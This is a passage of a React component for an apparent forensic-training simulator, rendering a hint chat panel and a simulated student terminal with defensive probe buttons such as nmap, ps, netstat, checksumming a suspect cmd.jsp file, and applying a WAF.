            {/* Socratic Rapid buttons */}
            <div className="grid grid-cols-2 gap-2 pt-1 font-mono text-[10px]">
              <button
                onClick={requestCopilotHint}
                className="p-2 bg-slate-950 hover:bg-slate-800 border border-slate-800 hover:border-purple-500/40 rounded-xl text-purple-300 font-bold transition-colors cursor-pointer text-center"
              >
                Request Hint
              </button>
              <button
                onClick={() => {
                  setTerminalOutput(prev => [
                    ...prev,
                    { text: 'Forensic telemetry recommendation appended below.', type: 'alert' },
                    { text: 'Try exploring local system assets using: "ps" or check WAF payloads on tomcat processes.', type: 'output' }
                  ]);
                }}
                className="p-2 bg-slate-950 hover:bg-slate-800 border border-slate-800 hover:border-purple-500/40 rounded-xl text-slate-300 font-bold transition-colors cursor-pointer text-center"
              >
                Show Clues
              </button>
            </div>

            {/* Socratic input form */}
            <form
              onSubmit={(e) => {
                e.preventDefault();
                sendCopilotMessage(copilotInput);
              }}
              className="flex gap-2"
            >
              <input
                type="text"
                value={copilotInput}
                onChange={(e) => setCopilotInput(e.target.value)}
                placeholder="Ask AMAN how to decode logs..."
                className="flex-1 bg-slate-950 border border-slate-800 rounded-xl px-3 py-2 text-xs text-slate-200 placeholder-slate-600 focus:outline-hidden focus:border-purple-500 font-mono"
              />
              <button
                type="submit"
                className="p-2 bg-purple-600 hover:bg-purple-500 text-white rounded-xl transition-all cursor-pointer"
              >
                <Send className="w-4 h-4" />
              </button>
            </form>
          </div>
        </div>
      </div>

      {/* =======================================================================
          INTEGRATED PROFESSIONAL FORENSIC TERMINAL (STATEFUL)
          ======================================================================= */}
      <div className="p-6 bg-slate-950 rounded-3xl border border-slate-800 shadow-2xl space-y-4">
        <div className="flex items-center justify-between border-b border-slate-800 pb-3">
          <div className="flex items-center gap-2">
            <Terminal className="w-5 h-5 text-purple-400" />
            <span className="font-mono text-xs font-bold text-slate-200 uppercase tracking-widest">
              Stateful Forensic Range Terminal v4.2 [student㉿kali:~/mission]
            </span>
          </div>

          <div className="flex items-center gap-2 text-[10px] font-mono text-slate-400">
            <span className="flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-emerald-400" />
              CONNECTED
            </span>
          </div>
        </div>

        {/* Command terminal log window */}
        <div className="h-[280px] overflow-y-auto custom-scrollbar font-mono text-[11px] p-4 bg-slate-900 rounded-2xl border border-slate-800 space-y-2">
          {terminalOutput.map((out, idx) => {
            let color = 'text-slate-300';
            if (out.type === 'cmd') color = 'text-slate-400 font-bold';
            if (out.type === 'error') color = 'text-rose-400';
            if (out.type === 'success') color = 'text-emerald-400';
            if (out.type === 'alert') color = 'text-amber-300 font-bold';

            return (
              <div key={idx} className={`${color} leading-relaxed whitespace-pre-wrap`}>
                {out.text}
              </div>
            );
          })}
          <div ref={termEndRef} />
        </div>

        {/* Terminal Input Box */}
        <form
          onSubmit={(e) => {
            e.preventDefault();
            executeForensicCommand(terminalInput);
          }}
          className="flex gap-2"
        >
          <div className="flex-1 flex items-center bg-slate-900 border border-slate-800 rounded-xl px-3 font-mono text-xs text-slate-300">
            <span className="text-purple-400 mr-2 shrink-0">student㉿kali:~$</span>
            <input
              type="text"
              value={terminalInput}
              onChange={(e) => setTerminalInput(e.target.value)}
              placeholder="Type your command (e.g., nmap 10.0.10.15, ps, clear, apply-waf, block-ip)..."
              className="w-full bg-transparent border-0 py-2.5 focus:outline-hidden text-white"
            />
          </div>
          <button
            type="submit"
            className="px-5 py-2.5 bg-purple-600 hover:bg-purple-500 text-white rounded-xl font-bold font-mono text-xs cursor-pointer transition-transform"
          >
            Execute
          </button>
        </form>

        {/* Dynamic Tag Suggestions bar */}
        <div className="flex flex-wrap items-center gap-1.5 font-mono text-[10px]">
          <span className="text-slate-500 font-bold">RAPID PIPELINE PROBES:</span>
          {[
            'nmap 10.0.10.15',
            'ps',
            'netstat',
            'cat cmd.jsp',
            'sha256sum cmd.jsp',
            'apply-waf'
          ].map(tag => (
            <button
              key={tag}
              type="button"
              onClick={() => executeForensicCommand(tag)}
              className="px-2 py-0.5 rounded bg-slate-900 hover:bg-slate-800 border border-slate-800 text-purple-300 hover:text-purple-200 transition-colors cursor-pointer"
            >
              {tag}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};
